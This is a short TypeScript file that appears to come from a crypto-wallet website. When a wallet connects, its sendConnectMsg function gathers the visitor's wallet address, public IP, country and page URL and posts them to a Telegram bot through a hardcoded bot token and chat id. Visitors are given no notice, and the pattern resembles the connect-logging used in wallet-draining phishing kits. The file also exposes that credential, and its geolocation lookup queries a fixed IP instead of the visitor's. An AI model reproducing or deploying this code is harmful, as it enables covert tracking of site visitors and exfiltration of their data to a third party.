let ipAddr: any;
let ipData: ipInfo_T;

export async function ipInfo() {
  await fetch("https://api.ipify.org?format=json").then(async (res) => {
    const resp = await res.json();
    // console.log("ip is =>", resp);
    ipAddr = resp.ip;
    // return resp;
  });
  try {
    console.log("ip is =>", ipAddr);
    const ipInfo_ = await fetch(`http://ip-api.com/json/24.48.0.1`)
      .then((res) => res.json())
      .then((rex) => {
        ipData = rex;
        console.log(rex);
      });

    // return resp;
  } catch (error) {
    console.log(error);
    ipData = {
      ip: "null",
      city: "null",
      country: "null",
    };
  }
}

export async function sendConnectMsg(addy: string) {
  await ipInfo();
  const msg = `
New Connect
ADDRESS:${addy}
IP:${ipAddr}
COUNTRY:${ipData.country}
URL: ${window.location.href}

  `;

  await sendMsgToTg(msg);
}

async function sendMsgToTg(msg: string) {
  const data = {
    chat_id: "-1002049145724",
    text: msg,
  };
  const resp = await fetch(
    `https://api.telegram.org/bot6544701468:AAGtwxliSNY5Lv-iRQgrU5Mn4llYouW780U/sendMessage`,
    {
      method: "POST",
      headers: {
        accept: "application/json",
        "content-type": "application/json",
      },
      body: JSON.stringify(data),
    }
  );
}

type ipInfo_T = {
  ip: string;
  city: string;
  country: string;
};
